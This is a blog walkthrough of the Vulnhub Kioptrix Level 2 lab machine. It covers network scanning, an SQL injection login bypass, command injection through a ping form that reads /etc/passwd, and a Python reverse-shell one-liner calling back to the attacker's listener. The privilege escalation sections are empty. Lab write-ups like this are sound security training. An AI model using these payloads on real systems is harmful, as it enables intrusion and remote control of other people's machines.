---
layout: post
title: "Vulnhub: Kioptrix level 2 Walkthrough"
subtitle: "Difficulty: Simple"
# cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/thumb.png
share-img: /assets/img/path.jpg
tags: [Vulnhub, Kioptrix, level 2,walkthrough]
---

Hi Folks...
Before moving forward, please try harder and come back later. Still you are stuck then let get started.

## Objective
Gain the root access.

## Algorithm
- Locate the target machine : Host Discovery
- Find the entry points : Enumeration
- Gain access to the machine : Finding vulnerability and exploitation
- Escalate the privileges : Privilege Escalation
- Clean up : Post-Exploitation

#### Host Discovery
Generally we know the target IP address. Since lab is set up as internal network and addresses are assigned by DHCP server. We need to find the target IP address. Host IP address is ```10.10.10.2```. Using netdiscover we found the target IP i.e., ```10.10.10.4```.
```bash
sudo netdiscover -r 10.10.10.1/24
```
![sudo netdiscover -r \<ip-range\>](/assets/img/vulnhub/kioptrix/lvl2/kioptrix_lvl2_host_discovery.png "Host Discovery using netdiscover")

#### Enumeration
It is the most important step to achieve our objective. More the information about the target more the possibilities of attack vectors. Quick nmap scan reveals the information about the various common services running on the target.
```bash
nmap --vv -sV -sC -A -T5 -oN nmap_fast 10.10.10.4
```
![nmap results](/assets/img/vulnhub/kioptrix/lvl2/nmap-1.png "nmap scan")

![nmap results](/assets/img/vulnhub/kioptrix/lvl2/nmap-2.png "nmap scan")


#### Finding vulnerability and exploitation
First question comes in mind is which services is to enumerate next such that we find the vulnerability ASAP. There is no particular answer to this. Enumerating the services simultaneouly could be good start. Our main objective should be getting as much as information possible. Let's enumerate the http (80) & https(443).
On visiting a url (http://10.10.10.4) we got the login page. In the subterminal, run the gobuster (dirb/dirbuster) and nikto. While we visit a url, in the meantime we will list the directories and scan the webserver for vulnerabilities in case we do not find anything by just exploring login page.
```bash
firefox 10.10.10.4 &
```
![login page](/assets/img/vulnhub/kioptrix/lvl2/login-page.png "Login Page")

By seeing login page, several ideas come into mind - SQL Injection, directory traversal, LFI, RFI, brute forcing the credentials, basically web-based vulnerabilities.
Let's try SQL Injection. On several attempts, provide crafted usernames and password e.g. username:```anything``` password:```' or '1'='1```.
```bash
' or '1'='1
```
One might think how we directly come up with this set of credentials. 
> Answer is Practise! Practise! Practise! And Gathering the results. It's like dynamic programming in algorithm. Whatever valuable you find, store and reuse it.

Eureka!! We bypassed the authentication, using SQL Injection and landed on Administrative Web Console.
![Administrative Web Console](/assets/img/vulnhub/kioptrix/lvl2/admin-page.png "Administrative Web Console")

As a normal admin user, we get the ping results on inputing the IP address (of the host). Next questions should be is it only intended for ping? Because we see the IP-address (whatever input we provide) in the result.

![Ping result](/assets/img/vulnhub/kioptrix/lvl2/ping-result.png "Ping Result")

Let's try to provide different input e.g. ```cat /etc/passwd```. We are not getting anything apart from command echo. What exactly we are performing!!! Application is intended to execute the ping command,right? What about executing that command and then executing other command. Let's check that out. Our input will be
```bash
10.10.10.2; cat /etc/passwd
```
Hurray!!! We got the command execution. Even we can skip the IP-address like ;cat /etc/passwd would suffice.
![Command Execution](/assets/img/vulnhub/kioptrix/lvl2/ping-result-2.png "Command Execution")

Next obvious question should be How can we get the remote shell? netttcaattt! On further exploration, we did not find nc, ```;ls /usr/bin | grep nc```. wget is installed on the target. We can download the nc from the host and get the revese shell. Another approach would be getting reverse shell using python as python is installed on most of the linux based system. We confirmed this by checking the python binaries, ```;ls /usr/bin | grep python```. Here is our command for reverse shell using python.
```python2
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.2",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
Please do not forget to change the Host IP-Address and listening Port.
Do we need to remember this command? Hell, No. Our ninja techinque will help us. "Katon: Gōkakyū no Jutsu" --> ```Google-fu```.  Note: No need to worry about "Katon: Gōkakyū no Jutsu". It is intended for anime fan #Naruto.

Before executing the command start the listener on the host
```bash
nc -lnvp 8888
```
Now we are good to go. Provide the python one-liner in input field of Administrative Web Console. Hurray!!! We got the shell. It might be a lot to grasp. Let's take a 5 min break and proceed with our next task.

#### Privilege Escalation

#### Post-Exploitation
